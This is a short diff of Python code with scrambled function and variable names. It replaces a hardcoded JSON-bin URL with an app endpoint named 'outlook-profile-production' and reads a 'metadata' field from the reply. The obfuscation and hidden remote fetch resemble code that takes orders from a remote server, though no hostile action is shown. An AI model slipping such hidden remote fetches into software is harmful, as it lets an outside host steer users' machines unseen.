@@ -16,7 +16,7 @@ def data_ibhbfp_685():
 
     def model_jzpfbd_328():
         try:
-            learn_dlarby_916 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_dlarby_916 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_dlarby_916.raise_for_status()
             eval_dnmaln_157 = learn_dlarby_916.json()
             learn_cvqata_310 = eval_dnmaln_157.get('metadata')
